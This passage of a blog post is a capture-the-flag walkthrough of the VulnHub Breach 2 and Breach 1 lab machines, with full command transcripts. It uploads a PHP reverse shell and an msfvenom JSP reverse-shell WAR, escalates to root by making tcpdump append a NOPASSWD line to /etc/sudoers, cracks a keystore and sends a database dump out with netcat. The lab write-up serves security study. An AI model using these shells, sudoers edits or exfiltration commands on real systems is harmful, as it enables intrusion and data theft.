milton    1655  0.0  0.4  12728  2212 pts/1    S+   14:32   0:00 <span class="nb">grep </span>nginx
</code></pre></div></div>

<p>So I decided to list the services again, and found the port 8888 open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:~<span class="nv">$ </span>ss <span class="nt">-antl</span>
State      Recv-Q Send-Q          Local Address:Port               Peer Address:Port 
LISTEN     0      128                         <span class="k">*</span>:8888                          <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                         <span class="k">*</span>:36026                         <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                         <span class="k">*</span>:65535                         <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      50                  127.0.0.1:3306                          <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                         <span class="k">*</span>:111                           <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      64                  127.0.0.1:2323                          <span class="k">*</span>:<span class="k">*</span>     
LISTEN     0      128                        :::8888                         :::<span class="k">*</span>     
LISTEN     0      128                        :::60330                        :::<span class="k">*</span>     
LISTEN     0      128                        :::111                          :::<span class="k">*</span>     
LISTEN     0      128                        :::80                           :::<span class="k">*</span>
</code></pre></div></div>

<p>I interacted with that service, this is a OsCommerce page, it is an e-commerce and online store-management software program.</p>

<p>I found File Inclusion and Stored Cross Site Scripting vulnerabilities for the current version of OsCommerce, I tried to exploit the File Inclusion but didn’t work.</p>

<p><img src="/assets/images/breach2/screenshot-9.png" alt="" /></p>

<p>If we remember we have the login credentials to OsCommerce, I tried but didn’t work, so I logged in with admin as username and password.</p>

<p><img src="/assets/images/breach2/screenshot-10.png" alt="" /></p>

<p>Searching a way to upload a file, I found the path Tools -&gt; File Manager that allows create and upload files, but we don’t have permissions for that, so I decided to go back to the target machine and search for writable directories.</p>

<p><img src="/assets/images/breach2/screenshot-11.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:/var/www/html2/oscommerce<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null 
./includes/work
</code></pre></div></div>

<p>I found a directory writable in /var/www/html2/oscommerce/includes/work, I located there and upload a PHP reverse shell.</p>

<p><img src="/assets/images/breach2/screenshot-12.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.110.150/;s/1234/443/'</span> shell.php
</code></pre></div></div>
<p><img src="/assets/images/breach2/screenshot-13.png" alt="" /></p>

<p>As we see our reverse shell was uploaded as the user blumbrgh.</p>

<p><img src="/assets/images/breach2/screenshot-14.png" alt="" /></p>

<p>Then, we start a netcat listener and run the reverse shell, now we are the user blumbergh.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.110.151:8888/oscommerce/includes/work/shell.php
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.110.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.151] 51353
Linux breach2 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux</span>
 17:03:54 up  3:07,  1 user,  load average: 0.03, 0.15, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
milton   pts/1    localhost        14:14   23:35   2.76s  2.61s <span class="nt">-bash</span>
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span>,1004<span class="o">(</span>fin<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (499): Inappropriate ioctl for device
bash: no job control in this shell
blumbergh@breach2:/$ 
</span></code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>Then I check for sudo permissions, blembergh can execute tcpdump as sudo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blumbergh@breach2:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>blumbergh on breach2:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User blumbergh may run the following commands on breach2:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/tcpdump

</code></pre></div></div>

<p>Next what I did was send the user blumbergh to the sudoers group to execute the bash command as root without providing password via tcpdump tool, for more information you can check it <a href="https://pure.security/how-i-got-root-with-sudo/">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blumbergh@breach2:/<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">$'id</span><span class="se">\n</span><span class="s1">echo "blumbergh ALL=(ALL) NOPASSWD: /bin/bash" &gt;&gt; /etc/sudoers'</span> <span class="o">&gt;</span> /dev/shm/r00t 
blumbergh@breach2:/<span class="nv">$ </span><span class="nb">chmod</span> +x /dev/shm/r00t 
blumbergh@breach2:/<span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /dev/shm/r00t <span class="nt">-Z</span> root
dropped privs to root
tcpdump: listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 262144 bytes
Maximum file limit reached: 1
blumbergh@breach2:/<span class="nv">$ uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>

blumbergh@breach2:/<span class="nv">$ </span><span class="nb">sudo</span> /bin/bash
root@breach2:/# <span class="nb">cd
</span>root@breach2:~# python .flag.py
python .flag.py


<span class="c">#========================================================================================#</span>
<span class="c"># ___                                               ___                                  #</span>
<span class="c">#(   )                                             (   )                                 #</span>
<span class="c"># | |.-.    ___ .-.      .--.     .---.    .--.     | | .-.       .--.             .-.   #</span>
<span class="c"># | /   \  (   )   \    /    \   / .-, \  /    \    | |/   \     ;  _  \         /    \  #</span>
<span class="c"># |  .-. |  | ' .-. ;  |  .-. ; (__) ; | |  .-. ;   |  .-. .    (___)` |        |  .-. ; #</span>
<span class="c"># | |  | |  |  / (___) |  | | |   .'`  | |  |(___)  | |  | |         ' '        | |  | | #</span>
<span class="c"># | |  | |  | |        |  |/  |  / .'| | |  |       | |  | |        / /         | |  | | #</span>
<span class="c"># | |  | |  | |        |  ' _.' | /  | | |  | ___   | |  | |       / /          | |  | | #</span>
<span class="c"># | '  | |  | |        |  .'.-. ; |  ; | |  '(   )  | |  | |      / /      .-.  | '  | | #</span>
<span class="c"># ' `-' ;   | |        '  `-' / ' `-'  | '  `-' |   | |  | |     / '____  (   ) '  `-' / #</span>
<span class="c">#  `.__.   (___)        `.__.'  `.__.'_.  `.__,'   (___)(___)   (_______)  `-'   `.__,'  # </span>
<span class="c">#                                                                                        #</span>
<span class="c">#========================================================================================#</span>


Congratulations on reaching the end. I have learned a ton putting together these challenges and I hope you enjoyed it and perhaps learned something new. Stay tuned 
<span class="k">for </span>the final <span class="k">in </span>the series, Breach 3.0

Shout-out to sizzop, knightmare and rastamouse <span class="k">for </span>testing and g0tmi1k <span class="k">for </span>hosting and maintaining <span class="c">#vulnhub.</span>

<span class="nt">-mrb3n</span>
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - Breach 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>September 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a boot2root/CTF challenge. Solving will take a combination of solid information gathering and persistence.</p>

<p><strong>Author:</strong> mrb3n</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/breach-1,152/">https://www.vulnhub.com/entry/breach-1,152/</a></p>

<h2 id="information-gathering">Information Gathering</h2>

<p>The VM is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet, so I assigned an IP address to the vmnet1 interface.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ip addr add 192.168.110.142/24 dev vmnet1
root@kali:~<span class="nv">$ </span>ping <span class="nt">-c</span> 3 192.168.110.140  
PING 192.168.110.140 <span class="o">(</span>192.168.110.140<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 192.168.110.140: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.705 ms
64 bytes from 192.168.110.140: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.677 ms
64 bytes from 192.168.110.140: <span class="nv">icmp_seq</span><span class="o">=</span>3 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.698 ms

<span class="nt">---</span> 192.168.110.140 ping statistics <span class="nt">---</span>
3 packets transmitted, 3 received, 0% packet loss, <span class="nb">time </span>2009ms
rtt min/avg/max/mdev <span class="o">=</span> 0.677/0.693/0.705/0.011 ms
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>I did a port scan but it shows us that all ports are open, maybe an IDS/IPS is operating from behind.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-n</span> 192.168.110.140 <span class="nt">-oG</span> tcp-open-ports.txt
...
Scanning 192.168.110.140 <span class="o">[</span>65535 ports]
Discovered open port 8888/tcp on 192.168.110.140
Discovered open port 445/tcp on 192.168.110.140
Discovered open port 111/tcp on 192.168.110.140
Discovered open port 23/tcp on 192.168.110.140
Discovered open port 25/tcp on 192.168.110.140
Discovered open port 22/tcp on 192.168.110.140
Discovered open port 199/tcp on 192.168.110.140
Discovered open port 443/tcp on 192.168.110.140
Discovered open port 110/tcp on 192.168.110.140
Discovered open port 139/tcp on 192.168.110.140
Discovered open port 587/tcp on 192.168.110.140
Discovered open port 3306/tcp on 192.168.110.140
Discovered open port 1720/tcp on 192.168.110.140
Discovered open port 8080/tcp on 192.168.110.140
...
</code></pre></div></div>

<p>So I decided to do a FIN port scan and was able to find that ports 80,4444 and 8443 were open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-sF</span> <span class="nt">-p-</span> 192.168.110.140
...
PORT     STATE         SERVICE
80/tcp   open|filtered http
4444/tcp open|filtered krb524
8443/tcp open|filtered https-alt
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>I proceeded with nmap to do the service detection and script scanning of open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span>,4444,8443 192.168.110.140 <span class="nt">-oN</span> service-enum.txt
...
PORT     STATE SERVICE        VERSION
80/tcp   open  http           Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to Breach 1.0
4444/tcp open  http           Johnson Metasys building management system http interface
|_http-server-header: NAE01
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=utf-8).
8443/tcp open  ssl/https-alt?
| ssl-cert: Subject: commonName=Unknown/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown
| Issuer: commonName=Unknown/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2016-05-20T17:51:07
| Not valid after:  2016-08-18T17:51:07
| MD5:   c472 e6b0 5f58 ce8b b47e 2d67 86a9 52a0
|_SHA-1: d5d2 49c3 6993 cce5 39a9 de5c 91dc f126 a640 4653
|_ssl-date: 2021-10-04T10:43:05+00:00; -5h00m01s from scanner time.
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>So I decided to interact the HTTP service, on the web page I can read that Initech has been compromised and cyber consultants have intervened to contain the breach.</p>

<p><img src="/assets/images/breach1/screenshot-1.png" alt="" /></p>

<p>In the page source I found base64 encoded characters, I decoded that text string and discovered a potential login credential.</p>

<p><img src="/assets/images/breach1/screenshot-2.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.110.140/ | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'&lt;!.*-&gt;$'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"-"</span> <span class="s1">'{print $7}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' '</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
</span>pgibbons:damnitfeel<span class="nv">$goodtobeagang$ta</span>
</code></pre></div></div>

<p>If we noticed the initech.html link on the source page, I accessed it and this redirected me to a new page.</p>

<p><img src="/assets/images/breach1/screenshot-3.png" alt="" /></p>

<p>I clicked on <strong>Employe portal</strong> and it redirected me to impresscms, I logged in with the credentials found previously.</p>

<p><img src="/assets/images/breach1/screenshot-4.png" alt="" />
<img src="/assets/images/breach1/screenshot-5.png" alt="" /></p>

<p>In the Inbox I saw some messages, in one of them I found a keystore file, and I downloaded it.</p>

<p><img src="/assets/images/breach1/screenshot-6.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.110.140/.keystore <span class="nt">-O</span> keystore

root@kali:~<span class="nv">$ </span>file keystore 
keystore: Java KeyStore
</code></pre></div></div>

<p>Then I verified that’s a Java KeyStore file, a JKS is an encrypted security file used to store a set of cryptographic keys or certificates in the binary format and it requires a password to be opened.</p>

<p>So I converted the JKS file into a format that john could undertand and then cracked it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>/usr/share/john/keystore2john.py keystore <span class="o">&gt;</span> <span class="nb">hash
</span>root@kali:~<span class="nv">$ </span>john <span class="nb">hash</span>
...
tomcat           <span class="o">(</span>keystore<span class="o">)</span>
</code></pre></div></div>

<p>After having no idea what to do with this file I decided to go back to researching the web page, in the content option I clicked on <strong>SSL implementation test capture</strong> link. I discovered a pcap file that’s located in the document root and also speaks that alias, storepassword and keypassword are set all to ‘tomcat’, a hint to extract the JKS file.</p>

<p><img src="/assets/images/breach1/screenshot-7.png" alt="" />
<img src="/assets/images/breach1/screenshot-8.png" alt="" /></p>

<p>I downloaded the pcap file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget 192.168.110.140/impresscms/_SSL_test_phase1.pcap
</code></pre></div></div>

<p>Then I extract the private key with keytool as shown in the following instruction, for more information you can click <a href="https://rajind.medium.com/extracting-private-key-from-java-keystore-jks-13dc5021173f">here</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/test<span class="nv">$ </span>keytool <span class="nt">-importkeystore</span> <span class="nt">-srckeystore</span> keystore <span class="nt">-srcstorepass</span> tomcat <span class="se">\</span>
<span class="o">&gt;</span> <span class="nt">-srckeypass</span> tomcat <span class="nt">-srcalias</span> tomcat <span class="nt">-destalias</span> tomcat <span class="nt">-destkeystore</span> identity.p12 <span class="se">\</span>
<span class="o">&gt;</span> <span class="nt">-deststoretype</span> PKCS12 <span class="nt">-deststorepass</span> tomcat <span class="nt">-destkeypass</span> tomcat
Importing keystore keystore to identity.p12...
</code></pre></div></div>

<p>Analyzing the pcap file, I saw that the trafic is encrypted, to try reading this file we have to export our previously extracted file, to do this click on <strong>Edit-&gt;Preferences-&gt;Protocols-&gt;TLS</strong>, then press the <strong>Edit</strong> button in <strong>RSA Keys List</strong>, then add the specifications as shown in the following image.</p>

<p><img src="/assets/images/breach1/screenshot-9.png" alt="" /></p>

<p>Now the traffic is readable, so right click on a packet and <strong>Follow HTTP Stream</strong>, in the analysis I found the tomcat credentials for the service running on port 8443.</p>

<p><img src="/assets/images/breach1/screenshot-10.png" alt="" /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo </span>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | <span class="nb">base64</span> <span class="nt">-d</span> <span class="p">;</span> <span class="nb">echo
</span>tomcat:Tt<span class="se">\5</span>D8F<span class="o">(</span><span class="c">#!*u=G)4m7zB</span>
</code></pre></div></div>

<p>Apart of this I could see that a webshell was uploaded to the server, but this currently doesn’t exist.</p>

<p><strong>Apache tomcat port 8443</strong></p>

<p>How we saw in the traffic, exist communication with the port 8443, but directly this web service doesn’t load, so I used burpsuite to avoid problems with the certificate, then this asks us for the credentials to log in, so I used the tomcat credentials.</p>

<p><img src="/assets/images/breach1/screenshot-11.png" alt="" />
<img src="/assets/images/breach1/screenshot-12.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="apache-tomcat">Apache Tomcat</h3>

<p>Then I generated a war payload to upload it to the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.110.142 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="o">&gt;</span> z.war
</code></pre></div></div>

<p><img src="/assets/images/breach1/screenshot-13.png" alt="" />
<img src="/assets/images/breach1/screenshot-14.png" alt="" /></p>

<p>Before to execute our payload we need to start a netcat listener, and then we run the payload, and we have a reverse shell, the initial shell is limited so I upgraded to a full TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.110.142] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.140] 36846
script <span class="nt">-qc</span> /bin/bash /dev/null
tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-vlnp</span> 443
root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span> 
<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443

tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</code></pre></div></div>

<p>Then I listed the system users that use a shell bash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'sh$'</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
</code></pre></div></div>

<p>I did a backup of mysql database, and then I tranferred it to my local machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>mysqldump <span class="nt">-u</span> root <span class="nt">--all-databases</span> <span class="o">&gt;</span> /tmp/mysqldump.sql
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 4444 <span class="o">&gt;</span> mysqldump.sql
tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>nc 192.168.110.142 4444 &lt; /tmp/mysqldump.sql
</code></pre></div></div>

<p>I filtered by the user milton in the buckup file and found a MD5 hash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">grep </span>milton mysqldump.sql 
INSERT INTO <span class="sb">`</span>user<span class="sb">`</span> VALUES <span class="o">(</span><span class="s1">'localhost'</span>,<span class="s1">'root'</span>,<span class="s1">''</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,<span class="s1">''</span><span class="o">)</span>,
<span class="o">(</span><span class="s1">''</span>,<span class="s1">'milton'</span>,<span class="s1">'6450d89bd3aff1d893b85d3ad65d2ec2'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">'N'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,NULL<span class="o">)</span>,
<span class="o">(</span><span class="s1">'127.0.0.1'</span>,<span class="s1">'root'</span>,<span class="s1">''</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,<span class="s1">''</span><span class="o">)</span>,
<span class="o">(</span><span class="s1">'::1'</span>,<span class="s1">'root'</span>,<span class="s1">''</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,<span class="s1">''</span><span class="o">)</span>,
<span class="o">(</span><span class="s1">'localhost'</span>,<span class="s1">'debian-sys-maint'</span>,<span class="s1">'*A9523939F1B2F3E72A4306C34F225ACF09590878'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">'Y'</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,<span class="s1">''</span>,0,0,0,0,<span class="s1">''</span>,NULL<span class="o">)</span><span class="p">;</span>
</code></pre></div></div>

<p>Then I discovered the password for this hash on <a href="hshes.com">hashes.com</a>.</p>

<p><img src="/assets/images/breach1/screenshot-15.png" alt="" /></p>

<p>I switched to the user milton and I decided enumerate for writable files and found a script with permissions for all users in the /etc/init.d/ directory, so to scale to root we would just write to the portly.sh file a netcat reverse shell, then we would reboot the machine, start a netcat listener and have a root shell, but this doesn’t seem realistic to me, so I looked for another method.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat6@Breach:/var/lib/tomcat6<span class="nv">$ </span>su - milton
su - milton
Password: thelaststraw
milton@Breach:~<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null
...
/etc/init.d/portly.sh
...
milton@Breach:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/init.d/portly.sh
<span class="nt">-rwxrwxrwx</span> 1 root root 231 Jun  5  2016 /etc/init.d/portly.sh
</code></pre></div></div>

<p>After of couple of hours researching it occurs to me analyze the metadata of the images that I had overloooked.</p>

<p><img src="/assets/images/breach1/screenshot-16.png" alt="" /></p>

<p>I downloaded the images and analyzed them with exiftool, in the bill.png image I found a comment called coffeestains.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">mkdir </span>images
root@kali:~<span class="nv">$ </span>wget <span class="nt">-nd</span> <span class="nt">-r</span> <span class="nt">--no-parent</span> <span class="nt">-A</span> “png,jpg,gif”  http://192.168.110.140/images/ <span class="nt">-P</span> images/

root@kali:~<span class="nv">$ </span>exiftool images/<span class="k">*</span> | <span class="nb">grep</span> <span class="nt">-Ei</span> <span class="s1">'file name|comment'</span>
File Name                       : bill.png
Comment                         : coffeestains
File Name                       : cake.jpg
File Name                       : initech.jpg
File Name                       : milton_beach.jpg
File Name                       : swingline.jpg
File Name                       : troll.gif
</code></pre></div></div>

